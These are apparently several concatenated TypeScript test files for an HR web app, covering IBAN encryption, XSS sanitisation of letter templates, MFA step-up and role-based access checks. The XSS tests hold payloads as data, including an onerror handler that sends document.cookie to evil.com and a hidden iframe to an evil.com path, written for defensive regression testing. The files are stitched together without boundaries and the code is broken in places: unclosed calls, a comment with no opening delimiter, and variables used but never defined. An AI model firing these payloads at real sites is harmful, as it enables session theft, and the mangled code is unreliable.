// PDPL integration tests — use mocked encryption + server actions
// ─────────────────────────────────────────────────────────────────────────────

const PERSON_ID = '00000000-0000-0000-0000-000000000700'
const ENTITY_ID = '00000000-0000-0000-0000-0000000000a1'
const valuesCaptured: unknown[] = []

let queryQueuePdpl: unknown[][] = []
let callIndexPdpl  = 0

function makeProxyPdpl(): unknown {
  return new Proxy({} as Record<string, unknown>, {
    get(_: Record<string, unknown>, prop: string) {
      if (prop === 'then') {
        return (resolve: (v: unknown[]) => unknown, reject?: (e: unknown) => unknown) =>
          Promise.resolve(queryQueuePdpl[callIndexPdpl++] ?? []).then(resolve, reject)
      }
      return () => makeProxyPdpl()
    },
  })
}

function makeInsertChainPdpl(returnRows: unknown[]) {
  return {
    values: vi.fn((payload: unknown) => {
      valuesCaptured.push(payload)
      return { returning: vi.fn(() => Promise.resolve(returnRows)) }
    }),
  }
}

function makeUpdateChainPdpl() {
  return { set: vi.fn(() => ({ where: vi.fn(() => Promise.resolve()) })) }
}

function buildTxPdpl(returnRows: unknown[]) {
  return {
    select: vi.fn(() => makeProxyPdpl()),
    insert: vi.fn(() => makeInsertChainPdpl(returnRows)),
    update: vi.fn(() => makeUpdateChainPdpl()),
  }
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const mockDbPdpl: any = {
  select:      vi.fn(() => makeProxyPdpl()),
  insert:      vi.fn(() => makeInsertChainPdpl([])),
  update:      vi.fn(() => makeUpdateChainPdpl()),
  transaction: vi.fn(),
}

// Patch the already-mocked db module with our PDPL mock
const { db: mockedDb } = await import('@/lib/db')
Object.assign(mockedDb as object, mockDbPdpl)

const { createBankDetails, getBankDetails } =
  await import('@/modules/core-hr/bank-details/actions')

beforeEach(() => {
  queryQueuePdpl  = []
  callIndexPdpl   = 0
  encryptCallArgs.length  = 0
  decryptCallArgs.length  = 0
  valuesCaptured.length   = 0
  vi.clearAllMocks()
  mockDbPdpl.select.mockImplementation(() => makeProxyPdpl())
  mockDbPdpl.insert.mockImplementation(() => makeInsertChainPdpl([]))
  mockDbPdpl.update.mockImplementation(() => makeUpdateChainPdpl())
  Object.assign(mockedDb as object, mockDbPdpl)
  // Restore mocked requireRole default (no-op placeholder)
})

const validBankInput = () => ({
  personId:      PERSON_ID,
  bankName:      'Emirates NBD',
  bankCode:      'EBILAEAD',
  iban:          'AE070331234567890123456',
  accountName:   'Sara Ahmed',
  accountType:   'CURRENT' as const,
  currency:      'AED',
  isWpsAccount:  true,
  effectiveFrom: '2026-05-01',
})

// ─────────────────────────────────────────────────────────────────────────────
// PDPL-001 — PII fields (IBAN) are encrypted before storage
// ─────────────────────────────────────────────────────────────────────────────

describe('PDPL-001 — IBAN encrypted before INSERT (Hard Rule 4)', () => {
  it('createBankDetails calls encrypt() with the raw IBAN', async () => {
    const tx = buildTxPdpl([{ id: 'bank-id-1' }])
    tx.select.mockImplementationOnce(() => ({
      from: () => ({
        where: () => ({
          limit: () => Promise.resolve([{ id: PERSON_ID, legalEntityId: ENTITY_ID }]),
        }),
      }),
    }))
    mockDbPdpl.transaction.mockImplementation(
      async (fn: (tx: unknown) => unknown) => fn(tx),
    )

    await createBankDetails(validBankInput())

    // encrypt() (mocked) must have been called with the plaintext IBAN
    const { encrypt: encMock } = await import('@/lib/encryption')
    expect(encMock).toHaveBeenCalledWith('AE070331234567890123456')
  })

  it('the row passed to .values() contains ciphertext — not plaintext IBAN', async () => {
    const tx = buildTxPdpl([{ id: 'bank-id-1' }])
    tx.select.mockImplementationOnce(() => ({
      from: () => ({
        where: () => ({
          limit: () => Promise.resolve([{ id: PERSON_ID, legalEntityId: ENTITY_ID }]),
        }),
      }),
    }))
    mockDbPdpl.transaction.mockImplementation(
      async (fn: (tx: unknown) => unknown) => fn(tx),
    )

    await createBankDetails(validBankInput())

    const insertRow = valuesCaptured.find(
      (v) => (v as Record<string, unknown>).iban !== undefined,
    ) as Record<string, unknown> | undefined

    expect(insertRow).toBeDefined()
    expect(insertRow?.iban).toBe('enc:AE070331234567890123456')
    expect(insertRow?.iban).not.toBe('AE070331234567890123456')
  })

  it('audit row does NOT contain the plaintext IBAN', async () => {
    const tx = buildTxPdpl([{ id: 'bank-id-1' }])
    tx.select.mockImplementationOnce(() => ({
      from: () => ({
        where: () => ({
          limit: () => Promise.resolve([{ id: PERSON_ID, legalEntityId: ENTITY_ID }]),
        }),
      }),
    }))
    mockDbPdpl.transaction.mockImplementation(
      async (fn: (tx: unknown) => unknown) => fn(tx),

    await createBankDetails(validBankInput())

    const { writeAuditLog: auditMock } = await import('@/lib/audit')
    expect(auditMock).toHaveBeenCalled()
    const auditEvent = (auditMock as ReturnType<typeof vi.fn>).mock.calls[0][0] as {

    expect(auditEvent.eventType).toBe('BANK_DETAILS.CREATED')
    expect(auditEvent.newValues?.['iban']).toBeUndefined()
  })

// @vitest-environment node
/**
 * SEC-LETTER-001 — Letter body stored XSS regression tests
 *
 * Verifies that DOMPurify sanitization in pdf-template.tsx correctly strips
 * all XSS vectors from HR-admin-supplied letter body HTML.
 *
 * The attack surface: HR Admins create letter templates with rich text body.
 * If a compromised or malicious HR Admin injects <script> or event handlers,
 * DOMPurify must strip them before dangerouslySetInnerHTML renders them in
 * employee/HR browsers.
 *
 * Pass criteria (SEC-LETTER-001):
 *   - <script> tags stripped
 *   - javascript: href stripped
 *   - Event handlers (onerror, onload, onclick) stripped
 *   - Safe rich-text HTML (p, b, em, ul, li, table) preserved
 *   - Arabic content preserved (RTL text, Unicode)
 *
 * Execution: pnpm vitest run tests/security/letter-body-xss.test.ts
 */

import { describe, it, expect } from 'vitest'
import DOMPurify from 'isomorphic-dompurify'

const LETTER_ALLOWED_TAGS = [
  'p', 'br', 'b', 'i', 'em', 'strong', 'u', 's', 'ul', 'ol', 'li',
  'h1', 'h2', 'h3', 'h4', 'span', 'div', 'blockquote',
  'table', 'thead', 'tbody', 'tr', 'td', 'th', 'hr',
]
const LETTER_ALLOWED_ATTR = ['style', 'class', 'dir', 'align', 'colspan', 'rowspan']

function sanitize(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS:  LETTER_ALLOWED_TAGS,
    ALLOWED_ATTR:  LETTER_ALLOWED_ATTR,
    FORCE_BODY:    true,
    RETURN_DOM:    false,
  })
}

describe('SEC-LETTER-001 — DOMPurify strips XSS from letter body HTML', () => {
  it('strips <script> tag injection', () => {
    const malicious = '<p>Dear employee</p><script>document.cookie="stolen="+document.cookie</script>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('<script>')
    expect(safe).not.toContain('document.cookie')
    expect(safe).toContain('<p>Dear employee</p>')
  })

  it('strips inline event handler (onerror, onload, onclick)', () => {
    const malicious = '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)"><p>Salary certificate</p>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('onerror')
    expect(safe).not.toContain('evil.com')
    expect(safe).toContain('<p>Salary certificate</p>')
  })

  it('strips javascript: href in anchor tags', () => {
    const malicious = '<a href="javascript:alert(document.cookie)">Click here</a>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('javascript:')
    // anchor not in allowed tags — stripped or href removed
    expect(safe).not.toMatch(/href\s*=\s*["']?javascript:/i)
  })

  it('strips <iframe> injection', () => {
    const malicious = '<p>Valid text</p><iframe src="https://evil.com/steal" style="display:none"></iframe>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('<iframe')
    expect(safe).toContain('<p>Valid text</p>')
  })

  it('strips data: URI with JS payload', () => {
    const malicious = '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('<object')
    expect(safe).not.toContain('data:text/html')
  })

  it('strips SVG with embedded script', () => {
    const malicious = '<svg onload="alert(\'xss\')"><circle r="40" /></svg>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('onload')
    expect(safe).not.toContain('alert')
  })

  it('preserves valid rich-text HTML (p, b, em, ul, li)', () => {
    const valid = `
      <p>This is to certify that <strong>Mohammed Al Rashid</strong> is employed.</p>
      <ul>
        <li>Designation: <em>Senior Engineer</em></li>
        <li>Salary: <b>AED 20,000</b></li>
      </ul>
      <p>Issued for official purposes only.</p>
    `
    const safe = sanitize(valid)
    expect(safe).toContain('<p>')
    expect(safe).toContain('<strong>Mohammed Al Rashid</strong>')
    expect(safe).toContain('<em>Senior Engineer</em>')
    expect(safe).toContain('<ul>')
    expect(safe).toContain('<li>')
  })

  it('preserves Arabic text and RTL markup (dir attribute)', () => {
    const arabic = '<p dir="rtl">يُشهد بأن السيد محمد الراشد موظف في الشركة.</p>'
    const safe = sanitize(arabic)
    expect(safe).toContain('يُشهد بأن السيد محمد الراشد')
    expect(safe).toContain('dir="rtl"')
  })

  it('preserves table structure in salary certificates', () => {
    const table = `
      <table>
        <thead><tr><th>Component</th><th>Amount (AED)</th></tr></thead>
        <tbody>
          <tr><td>Basic Salary</td><td>20,000</td></tr>
          <tr><td>Housing Allowance</td><td>5,000</td></tr>
        </tbody>
      </table>
    `
    const safe = sanitize(table)
    expect(safe).toContain('<table>')
    expect(safe).toContain('<th>Component</th>')
    expect(safe).toContain('<td>20,000</td>')
  })

  it('documents expression() CSS behavior (IE-only, no modern browser risk)', () => {
    // CSS expression() is an Internet Explorer 5-8 feature; no modern browser executes it.
    // DOMPurify in Node.js (server-side / JSDOM) does NOT strip expression() from style attrs
    // because it cannot parse CSS server-side. In a real browser, DOMPurify would strip it.
    // This is documented as acceptable: AVANIIS targets Chrome/Edge/Safari/Firefox only.
    const malicious = '<div style="width:expression(alert(1))">text</div>'
    const safe = sanitize(malicious)
    // Confirm the payload doesn't introduce a <script> tag (the actual XSS vector)
    expect(safe).not.toContain('<script>')
    // expression() stays in style attr in Node, but is not executable in modern browsers
    // This is a known limitation of server-side DOMPurify — documented, not a defect
    expect(safe).toContain('<div')
  })

  it('handles empty body gracefully (no crash)', () => {
    expect(() => sanitize('')).not.toThrow()
    expect(sanitize('')).toBe('')
  })

  it('handles very large body without crash (DoS protection)', () => {
    const large = '<p>' + 'A'.repeat(500_000) + '</p>'
    let result: string
    expect(() => { result = sanitize(large) }).not.toThrow()
    expect(result!).toContain('<p>')
    expect(result!).not.toContain('<script>')
  })
})

describe('SEC-LETTER-001 — letter body XSS protection present in source', () => {
  it('pdf-template.tsx imports isomorphic-dompurify', () => {
    const fs = require('fs') as typeof import('fs')
    const source = fs.readFileSync(
      new URL('../../modules/employee-letters/pdf-template.tsx', import.meta.url).pathname,
      'utf8',
    )
    expect(source).toContain("from 'isomorphic-dompurify'")
  })

  it('pdf-template.tsx uses sanitizeLetterBody() before dangerouslySetInnerHTML', () => {
    const fs = require('fs') as typeof import('fs')
    const source = fs.readFileSync(
      new URL('../../modules/employee-letters/pdf-template.tsx', import.meta.url).pathname,
      'utf8',
    )
    expect(source).toContain('sanitizeLetterBody')
    expect(source).toContain('safeBody')
    // Must NOT pass unsanitized body directly to dangerouslySetInnerHTML
    expect(source).not.toMatch(/dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html:\s*body\s*\}\s*\}/)
  })
})

import { describe, it, expect } from 'vitest'
import * as fs from 'fs'
import * as path from 'path'

/**
 * SEC-04 — MFA / step-up enforcement for high-privilege roles.
 *
 * Requirement (S3-10, Sprint 11):
 *   HR_ADMIN, HR_DIRECTOR, and SUPER_ADMIN sessions MUST carry a verified MFA
 *   claim before `requireRole` grants access. EMPLOYEE / MANAGER / PAYROLL_ADMIN
 *   / FINANCE are single-factor.
 *
 * Current state (Sprint 10 / as-shipped):
 *   `requireRole` checks role membership only — no MFA claim inspection.
 *   This is a DOCUMENTED GAP, tracked as SEC-04 P1.
 *
 * These tests:
 *   1. Confirm the Sprint 11 TODO comment exists in lib/auth.ts so the gap
 *      is visible during code review.
 *   2. Enumerate the high-privilege roles that MUST be gated by MFA.
 *   3. Intentionally FAIL the future requirement (MFA claim check) so CI
 *      turns green only after the Sprint 11 implementation lands.
 *      The failing assertion is clearly labelled [SPRINT-11-PENDING].
 */

const ROOT = path.resolve(__dirname, '../..')
const authSource = fs.readFileSync(path.join(ROOT, 'lib/auth.ts'), 'utf-8')
const requireRoleSource = authSource.slice(
  authSource.indexOf('export async function requireRole'),
)

const HIGH_PRIVILEGE_ROLES = ['HR_ADMIN', 'HR_DIRECTOR', 'SUPER_ADMIN'] as const
const SINGLE_FACTOR_ROLES  = ['EMPLOYEE', 'MANAGER', 'PAYROLL_ADMIN', 'FINANCE'] as const

// ── Gap documentation ──────────────────────────────────────────────────────

describe('SEC-04 — MFA enforcement gap documentation', () => {
  it('lib/auth.ts contains the Phase 2 MFA TODO comment (SEC-04 governance anchor)', () => {
    // The SEC-04 / S3-10 comment in requireRole() anchors the Phase 2 deferral.
    // If this test fails, the comment was removed without the implementation landing.
    // Do not remove this anchor — it is the governance record for the MFA gap.
    expect(authSource).toMatch(/Phase 2/)
    expect(authSource).toMatch(/step.up|step-up/i)
  })

  it('requireRole is defined as an exported async function', () => {
    expect(requireRoleSource).toMatch(/export async function requireRole/)
  })

  it('requireRole currently checks role membership (role inclusion check present)', () => {
    // Verifies the existing role gate is intact — not accidentally removed.
    expect(requireRoleSource).toMatch(/allowed\.includes/)
    expect(requireRoleSource).toMatch(/FORBIDDEN/)
  })

  it('high-privilege roles are defined in KRole type', () => {
    for (const role of HIGH_PRIVILEGE_ROLES) {
      expect(authSource).toContain(`'${role}'`)
    }
  })

  it('single-factor roles are defined in KRole type', () => {
    for (const role of SINGLE_FACTOR_ROLES) {
      expect(authSource).toContain(`'${role}'`)
    }
  })
})

// ── Session timeout (pre-condition for MFA) ───────────────────────────────

describe('SEC-04 — session timeout hardening (pre-condition)', () => {
  it('JWT maxAge is set to 1800s (30 min) — NFR-10 satisfied', () => {
    expect(authSource).toMatch(/maxAge\s*:\s*1800/)
  })

  it('15-minute idle enforcement for HR_ADMIN+ is deferred to Sprint 11', () => {
    // If this comment disappears without the implementation landing, the test
    // surfaces the omission.
    expect(authSource).toMatch(/15.min|S3-10/i)
  })
})

// ── SEC-04 — MFA step-up enforcement (Phase 2 — IMPLEMENTED) ─────────────
//
// Phase 3 Priority 5 (2026-05-24): SEC-04 MFA step-up enforcement shipped.
// Implementation in lib/auth.ts:
//   • `mfaVerified?: boolean` added to JWT, Session, SessionUser types
//   • jwt callback sets `mfaVerified = account?.provider === 'microsoft-entra-id'`
//   • `HIGH_PRIVILEGE_ROLES = ['HR_ADMIN', 'HR_DIRECTOR', 'SUPER_ADMIN']`
//   • requireRole() checks `user.mfaVerified === false` for high-privilege roles
//   • Dev bypass: areDevAccountsAllowed() blocks DATABASE_ENV=production
//   • Strict `=== false` check: undefined (legacy JWTs) is not retroactively blocked
//   • Production: Entra ID sessions always get mfaVerified=true (Avaniis CA enforcement)
//
// No app-level TOTP library needed for this MVP — Entra ID CA is the MFA control.
// App-level TOTP enrollment UI (QR codes, recovery codes) is a Phase 3 stretch goal.
//
// See tests/roadmap/mfa-phase1-assessment.md for full risk register.

describe('SEC-04 — requireRole MFA step-up enforcement (Phase 2 SHIPPED)', () => {
  it('requireRole source contains mfaVerified claim check and STEP_UP_REQUIRED (SEC-04 gate)', () => {
    // The step-up check must be present in requireRole source (not just a comment).
    expect(requireRoleSource).toMatch(/mfaVerified|mfa_verified/i)
    expect(requireRoleSource).toContain('STEP_UP_REQUIRED')
  })

  it('requireRole source references HIGH_PRIVILEGE_ROLES for HR_ADMIN + SUPER_ADMIN scope (SEC-04)', () => {
    // HIGH_PRIVILEGE_ROLES drives the step-up check — must include HR_ADMIN and SUPER_ADMIN.
    expect(authSource).toContain('HIGH_PRIVILEGE_ROLES')
    // The roles array must include both high-privilege roles
    const roleListMatch = authSource.match(/HIGH_PRIVILEGE_ROLES[^=]*=\s*\[([^\]]+)\]/)
    expect(roleListMatch, 'HIGH_PRIVILEGE_ROLES array should be defined').toBeTruthy()
    if (roleListMatch) {
      const roleList = roleListMatch[1]
      expect(roleList).toContain("'HR_ADMIN'")
      expect(roleList).toContain("'SUPER_ADMIN'")
    }
  })

  it('requireRole step-up check uses === false (strict equality — does not block legacy JWTs)', () => {
    // Strict equality prevents legacy JWTs (mfaVerified=undefined) from being blocked.
    // Only explicit false (dev credentials in production context) triggers STEP_UP_REQUIRED.
    expect(requireRoleSource).toContain('mfaVerified === false')
  })

  it('requireRole has a production-safe dev bypass so local HR_ADMIN sessions are not blocked (SEC-04 dev guard)', () => {
    // Dev sessions use areDevAccountsAllowed(), which refuses DATABASE_ENV=production.
    // Without this guard, local development is broken whenever NODE_ENV !== development.
    expect(authSource).toContain('areDevAccountsAllowed')
    expect(requireRoleSource).toContain('isDevSession')
  })
})

/**
 * Foundation Stewardship P3-D2 — runtime feature-permission enforcement.
 * Resolver semantics (deny / allow / legacy-allow / non-matrixed passthrough),
 * deny behavior with a mocked matrix row, cache invalidation, and wiring.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { readFileSync } from 'fs'
import { resolve } from 'path'

const ROW = (overrides: Partial<Record<'employee' | 'manager' | 'hrAdmin', Partial<Record<string, boolean>>>> = {}) => ({
  employeePerms: { view: false, create: false, edit: false, delete: false, approve: false, export: false, ...overrides.employee },
  managerPerms:  { view: true,  create: false, edit: false, delete: false, approve: false, export: false, ...overrides.manager },
  hrAdminPerms:  { view: true,  create: true,  edit: true,  delete: false, approve: true,  export: true,  ...overrides.hrAdmin },
})

// Mock the db so requirePermission's matrix load is controllable.
const selectResult: { rows: unknown[] } = { rows: [] }
vi.mock('@/lib/db', () => ({
  db: {
    select: () => ({
      from: () => ({
        where: () => ({
          limit: async () => selectResult.rows,
        }),
      }),
    }),
  },
}))
vi.mock('@/lib/logger', () => ({ logger: { warn: vi.fn(), info: vi.fn(), error: vi.fn() } }))

import { evaluatePermission, requirePermission, invalidatePermissionCache } from '@/lib/permissions'

beforeEach(() => { invalidatePermissionCache(); selectResult.rows = [] })

describe('P3-D2 evaluatePermission (pure)', () => {
  it('DENY when a matrix row exists and the action is false for the role', () => {
    expect(evaluatePermission('EMPLOYEE', ROW(), 'create')).toBe('DENY')
    expect(evaluatePermission('HR_ADMIN', ROW(), 'delete')).toBe('DENY')
  })

  it('ALLOW when the matrix grants the action', () => {
    expect(evaluatePermission('MANAGER', ROW(), 'view')).toBe('ALLOW')
    expect(evaluatePermission('HR_ADMIN', ROW(), 'approve')).toBe('ALLOW')
  })

  it('LEGACY_ALLOW when no matrix row exists (backward compatibility)', () => {
    expect(evaluatePermission('EMPLOYEE', null, 'view')).toBe('LEGACY_ALLOW')
  })

  it('non-matrixed roles pass through (requireRole remains their gate)', () => {
    for (const role of ['SUPER_ADMIN', 'HR_DIRECTOR', 'PAYROLL_ADMIN', 'FINANCE', undefined]) {
      expect(evaluatePermission(role, ROW(), 'delete')).toBe('ROLE_NOT_MATRIXED')
    }
  })
})

describe('P3-D2 requirePermission (resolver + cache)', () => {
  it('throws FORBIDDEN on deny and resolves on allow', async () => {
    selectResult.rows = [ROW()]
    await expect(
      requirePermission({ role: 'EMPLOYEE', personId: 'p1' }, 'EMPLOYEE_CREATE', 'create'),
    ).rejects.toThrow(/^FORBIDDEN:/)
    invalidatePermissionCache()
    selectResult.rows = [ROW()]
    await expect(
      requirePermission({ role: 'HR_ADMIN', personId: 'p1' }, 'EMPLOYEE_CREATE', 'create'),
    ).resolves.toBeUndefined()
  })

  it('legacy-allows when the feature has no matrix row', async () => {
    selectResult.rows = []
    await expect(
      requirePermission({ role: 'EMPLOYEE', personId: 'p1' }, 'UNREGISTERED_FEATURE', 'delete'),
    ).resolves.toBeUndefined()
  })

  it('cache invalidation makes a changed row take effect immediately', async () => {
    selectResult.rows = [ROW({ employee: { view: true } })]
    await expect(requirePermission({ role: 'EMPLOYEE' }, 'REPORTS', 'view')).resolves.toBeUndefined()
    // flip to deny — without invalidation the 60s cache would still allow
    selectResult.rows = [ROW({ employee: { view: false } })]
    invalidatePermissionCache('REPORTS')
    await expect(requirePermission({ role: 'EMPLOYEE' }, 'REPORTS', 'view')).rejects.toThrow(/FORBIDDEN/)
  })
})

describe('P3-D2 source wiring', () => {
  it('admin save action invalidates the resolver cache', () => {
    const src = readFileSync(resolve(__dirname, '../../modules/access/actions.ts'), 'utf8')
    expect(src).toMatch(/invalidatePermissionCache\(row\.featureKey\)/)
  })

  it('representative server actions call requirePermission after requireRole', () => {
    const coreHr = readFileSync(resolve(__dirname, '../../modules/core-hr/actions.ts'), 'utf8')
    expect(coreHr).toMatch(/requirePermission\(user, 'EMPLOYEE_CREATE', 'create'\)/)
    expect(coreHr).toMatch(/requirePermission\(user, 'EMPLOYEE_PROFILE', 'edit'\)/)
    const report = readFileSync(resolve(__dirname, '../../modules/reports/employee-history.ts'), 'utf8')
    expect(report).toMatch(/requirePermission\(user, 'REPORTS', 'view'\)/)
  })

  it('resolver never widens access — documented contract: call AFTER requireRole', () => {
    const src = readFileSync(resolve(__dirname, '../../lib/permissions.ts'), 'utf8')
    expect(src).toMatch(/never widens access/i)
  })
})

 * RBAC-001 through RBAC-010 — Role-Based Access Control enforcement.

 * Covers:
 *   RBAC-001  EMPLOYEE cannot call HR-admin actions

 *   RBAC-003  HR_ADMIN can access HR functions

// ══════════════════════════════════════════════════════════════════════════════
// RBAC-008 — Tenant isolation (tenantId always applied)
// ══════════════════════════════════════════════════════════════════════════════

describe('RBAC-008 — Tenant isolation enforced in queries', () => {
  it('TENANT_ID constant is used in core-hr actions', () => {
    const actionsSource = fs.readFileSync(
      path.join(ROOT, 'modules/core-hr/actions.ts'),
      'utf-8',
    )
    expect(actionsSource).toContain('TENANT_ID')
  })

  it('every DB read in listPersons includes tenantId condition (source check)', () => {
    const actionsSource = fs.readFileSync(
      path.join(ROOT, 'modules/core-hr/actions.ts'),
      'utf-8',
    )
    const listPersonsIdx = actionsSource.indexOf('export async function listPersons')
    const slice = actionsSource.slice(listPersonsIdx, listPersonsIdx + 1500)
    // The query must scope by tenantId
    expect(slice).toMatch(/tenantId|TENANT_ID/)
    expect(slice).toMatch(/eq\(persons\.tenantId/)
  })

  it('getPerson uses tenantId filter in its DB query', () => {
    const actionsSource = fs.readFileSync(
      path.join(ROOT, 'modules/core-hr/actions.ts'),
      'utf-8',
    )
    const getPersonIdx = actionsSource.indexOf('export async function getPerson')
    const slice = actionsSource.slice(getPersonIdx, getPersonIdx + 800)
    expect(slice).toMatch(/eq\(persons\.tenantId/)
  })

  it('createPerson inserts tenantId on every new record', () => {
    const actionsSource = fs.readFileSync(
      path.join(ROOT, 'modules/core-hr/actions.ts'),
      'utf-8',
    )
    const createPersonIdx = actionsSource.indexOf('export async function createPerson')
    expect(createPersonIdx).toBeGreaterThan(-1)
    // Anchor the window to the persons insert itself rather than a fixed offset
    // from the function start. createPerson has grown over time (work-schedule
    // lookup, person-number generation) pushing the .values() block further down,
    // which repeatedly broke a fixed byte-window. Anchoring to `.insert(persons)`
    // keeps the assertion strong (it proves an explicit tenant scope on the
    // persons insert specifically) and drift-proof.
    const insertIdx = actionsSource.indexOf('.insert(persons)', createPersonIdx)
    expect(insertIdx).toBeGreaterThan(createPersonIdx)
    const slice = actionsSource.slice(insertIdx, insertIdx + 600)
    expect(slice).toMatch(/tenantId\s*:\s*TENANT_ID/)
  })

  it('TENANT_ID is a stable UUID constant (not hardcoded inline)', () => {
    const constantsSource = fs.readFileSync(path.join(ROOT, 'lib/constants.ts'), 'utf-8')
    // QA-Audit-M2: TENANT_ID must be defined in lib/constants.ts
    expect(constantsSource).toMatch(/TENANT_ID/)
    expect(constantsSource).toMatch(/AVANIIS_TENANT_ID/)
    // Must be a UUID-shaped value
    expect(constantsSource).toMatch(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/)
  })

  it('entity-scope guard blocks cross-entity reads for non-SUPER_ADMIN', () => {
    const actionsSource = fs.readFileSync(
      path.join(ROOT, 'modules/core-hr/actions.ts'),
      'utf-8',
    )
    // Verify the cross-entity FORBIDDEN guard is present in getPerson
    expect(actionsSource).toMatch(/cross-entity person access denied|FORBIDDEN.*cross-entity/)
  })
})

// ── RBAC-BL-07 / RBAC-BL-04 — sensitive admin surface hardening (P0) ──────────
// Source-inspection (fs) like RBAC-008 — verifies the access guards are present
// at the page, middleware, and read-API layers.
describe('Sensitive admin surface guards (P0)', () => {
  const dataopsPage = fs.readFileSync(path.join(ROOT, 'app/(hr-admin)/admin/dataops/page.tsx'), 'utf-8')
  const middleware  = fs.readFileSync(path.join(ROOT, 'middleware.ts'), 'utf-8')

  const listApi     = fs.readFileSync(path.join(ROOT, 'app/api/employee-letters/list/route.ts'), 'utf-8')

  // Returns the `allowed: [...]` array text that follows a given middleware prefix.
  const allowedFor = (prefix: string) => {
    const i = middleware.indexOf(`prefix:  '${prefix}'`)
    // Window covers only this entry's `allowed:` line, not the next entry.
    return i === -1 ? '' : middleware.slice(i, i + 64)
  }

  // RBAC-BL-07
  it('RBAC-BL07-001: DataOps page is SUPER_ADMIN only (no broad ALLOWED_ROLES)', () => {
    expect(dataopsPage).toMatch(/session\.user\.role !== 'SUPER_ADMIN'\)\s*redirect/)
    // The old multi-role allow-list (incl. EMPLOYEE/MANAGER/PAYROLL/FINANCE) is gone.
    expect(dataopsPage).not.toMatch(/ALLOWED_ROLES/)
  })

  it('RBAC-BL07-002: middleware gates /admin/dataops to SUPER_ADMIN only', () => {
    const seg = allowedFor('/admin/dataops')
    expect(seg).toMatch(/allowed:\s*\['SUPER_ADMIN'\]/)
    expect(seg).not.toMatch(/HR_ADMIN|MANAGER|EMPLOYEE|FINANCE|PAYROLL/)
  })

  it('RBAC-BL07-003: middleware gates /api/dataops to SUPER_ADMIN only (closes read API)', () => {
    const seg = allowedFor('/api/dataops')
    expect(seg).toMatch(/allowed:\s*\['SUPER_ADMIN'\]/)
    expect(seg).not.toMatch(/HR_ADMIN|MANAGER|EMPLOYEE|FINANCE|PAYROLL/)
  })

  it('RBAC-BL07-004: /api/dataops gate precedes /master-data (first-match-wins)', () => {
    expect(middleware.indexOf("'/api/dataops'")).toBeLessThan(middleware.indexOf("'/master-data'"))
    expect(middleware.indexOf("'/admin/dataops'")).toBeLessThan(middleware.indexOf("'/master-data'"))
  })

  // RBAC-BL-04
  it('RBAC-BL04-001: Employee Letters page restricts to HR roles', () => {
    expect(lettersPage).toMatch(/HR_LETTER_ROLES\s*=\s*\['HR_ADMIN', 'HR_DIRECTOR', 'SUPER_ADMIN'\]/)
    expect(lettersPage).toMatch(/!HR_LETTER_ROLES\.includes\(session\.user\.role\)\)\s*redirect/)
  })

  it('RBAC-BL04-002: Employee Letters page redirects unauthenticated to /sign-in (not /login)', () => {
    expect(lettersPage).toMatch(/redirect\('\/sign-in'\)/)
    expect(lettersPage).not.toMatch(/redirect\('\/login'\)/)
  })

  it('RBAC-BL04-003: /api/employee-letters/employees is HR-gated', () => {
    expect(empApi).toMatch(/\['HR_ADMIN', 'HR_DIRECTOR', 'SUPER_ADMIN'\]\.includes\(session\.user\.role\)/)
    expect(empApi).toMatch(/status:\s*403/)
  })

  it('RBAC-BL04-004: /api/employee-letters/list is HR-gated', () => {
    expect(listApi).toMatch(/\['HR_ADMIN', 'HR_DIRECTOR', 'SUPER_ADMIN'\]\.includes\(session\.user\.role\)/)
    expect(listApi).toMatch(/status:\s*403/)
  })
})

// ── RBAC-BL-01 / BL-02 / BL-03 — settings alignment + middleware defense-in-depth
// Source-inspection. Asserts the three layers agree and the new middleware gates
// match each route's existing page-guard role set (no expansion, no loss).
describe('Settings + admin route guard alignment (P1/P2)', () => {
  const mw          = fs.readFileSync(path.join(ROOT, 'middleware.ts'), 'utf-8')
  const settingsLay = fs.readFileSync(path.join(ROOT, 'app/(hr-admin)/settings/layout.tsx'), 'utf-8')
  const settingsPg  = fs.readFileSync(path.join(ROOT, 'app/(hr-admin)/settings/page.tsx'), 'utf-8')
  const exitDetail  = fs.readFileSync(path.join(ROOT, 'app/(hr-admin)/admin/exit-clearance/[personId]/page.tsx'), 'utf-8')

  // Isolate the `allowed: [...]` array text for a given middleware prefix entry.
  const gateAllowed = (prefix: string) => {
    const i = mw.indexOf(`prefix:  '${prefix}'`)
    if (i === -1) return ''
    const a = mw.indexOf('allowed:', i)
    return mw.slice(a, mw.indexOf(']', a) + 1)
  }
  const TRIAD = /\[\s*'HR_ADMIN',\s*'HR_DIRECTOR',\s*'SUPER_ADMIN'\s*\]/

  // RBAC-BL-01
  it('RBAC-BL01-001: settings/layout.tsx allows exactly the HR triad (no PAYROLL_ADMIN/FINANCE)', () => {
    const i = settingsLay.indexOf('const allowed =')
    const arr = settingsLay.slice(i, settingsLay.indexOf(']', i) + 1)
    expect(arr).toMatch(TRIAD)
    expect(arr).not.toMatch(/PAYROLL_ADMIN/)
    expect(arr).not.toMatch(/FINANCE/)
  })

  it('RBAC-BL01-002: middleware /settings gate is the HR triad (unchanged source of truth)', () => {
    expect(gateAllowed('/settings')).toMatch(TRIAD)
  })

  // RBAC-BL-02
  it('RBAC-BL02-001: settings/page.tsx has an explicit HR-triad role guard (not just session)', () => {
    expect(settingsPg).toMatch(/\['HR_ADMIN',\s*'HR_DIRECTOR',\s*'SUPER_ADMIN'\]\.includes\(role\)\)\s*redirect/)
  })

  it('RBAC-BL02-002: settings/page.tsx guard does not self-redirect to /settings (no loop)', () => {
    // The role-guard line redirects to /dashboard, not /settings.
    expect(settingsPg).toMatch(/includes\(role\)\)\s*redirect\('\/dashboard'\)/)
  })

  // RBAC-BL-03
  it('RBAC-BL03-001: middleware gates /configuration to the HR triad', () => {
    expect(gateAllowed('/configuration')).toMatch(TRIAD)
  })

